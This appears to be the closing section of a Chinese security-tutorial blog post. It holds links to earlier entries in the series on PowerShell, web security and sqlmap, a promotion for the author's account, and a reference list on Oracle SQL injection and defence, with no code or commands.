*   [[网络安全] 二十二. Powershell 基础入门及常见用法 - 1](http://mp.weixin.qq.com/s?__biz=Mzg5MTM5ODU2Mg==&mid=2247489093&idx=1&sn=216374f1db9af3e1bb4f9431b66237a3&chksm=cfcca688f8bb2f9e9fc25c1d1e21d3bceae0a9ff026f57e6e6df2ffa20597aa8356c15ea2280&scene=21#wechat_redirect)
    
*   [[网络安全] 二十三. Powershell 基础入门之常见语法及注册表操作 - 2](http://mp.weixin.qq.com/s?__biz=Mzg5MTM5ODU2Mg==&mid=2247489150&idx=1&sn=969db0e97868fe64fb03776b77bf7d13&chksm=cfcca6b3f8bb2fa56d2c9e4b2bdbd5abcc04ee724ee6cd2abbb059fca9ae65d6595ca98c2624&scene=21#wechat_redirect)
    
*   [[网络安全] 二十四. Web 安全学习路线及木马、病毒和防御初探](http://mp.weixin.qq.com/s?__biz=Mzg5MTM5ODU2Mg==&mid=2247489258&idx=1&sn=0fcfeb9555982c10eca90d2a78c5b58f&chksm=cfcca627f8bb2f315c8b089fcbeded22ab3515980a618857349e606e049d6a8d73bf79743ffe&scene=21#wechat_redirect)
    
*   [[网络安全] 二十五. 虚拟机 VMware+Kali 安装入门及 Sqlmap 基本用法](http://mp.weixin.qq.com/s?__biz=Mzg5MTM5ODU2Mg==&mid=2247489455&idx=1&sn=3835d420386dfb1df32f0f550f21b0d8&chksm=cfcca762f8bb2e7493a99415b19145f8c35b9af19dd6904511d525485fb9f98e310eb12e3054&scene=21#wechat_redirect)  
    

2020 年 8 月 18 新开的 “娜璋 AI 安全之家”，主要围绕 Python 大数据分析、网络空间安全、人工智能、Web 渗透及攻防技术进行讲解，同时分享 CCF、SCI、南核北核论文的算法实现。娜璋之家会更加系统，并重构作者的所有文章，从零讲解 Python 和安全，写了近十年文章，真心想把自己所学所感所做分享出来，还请各位多多指教，真诚邀请您的关注！谢谢。2021 年继续加油！

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDROZePZ27y7oibNu4BGibRAq4HydK4JWeQXtQMKibpFEkxNKClkDoicWRC06FHBp99ePyoKPGkOdPDezhg/640?wx_fmt=png)

(By:Eastmount 2021-03-25 周四夜于武汉)

参考文章如下，特别感谢胡老师。  

*   https://www.ichunqiu.com/open/66999
    
*   [Oracle 注入 贝塔安全实验室 - Cream 老师 (强推)](https://mp.weixin.qq.com/s?__biz=Mzg4MzA4Nzg4Ng==&mid=2247484345&idx=1&sn=572c2202976447a0a0639aa7fff23091&scene=21#wechat_redirect)
    
*   windows server 2008r2 oracle11g 安装 - CSDN
    
*   oracle 19c --windows 上安装部署 - CSDN
    
*   https://www.o2oxy.cn/2306.html
    
*   张炳帅. Web 安全深度剖析 [J]. 中国信息化, 2019, 000(001): 封 3.
    
*   克拉克 (JustinClarke).SQL 注入攻击与防御 [M]. 北京: 清华大学出版社, 2013.
    
*   张恒智. Oracle 数据库的注入攻击和防御研究 [D]. 上海交通大学, 2012.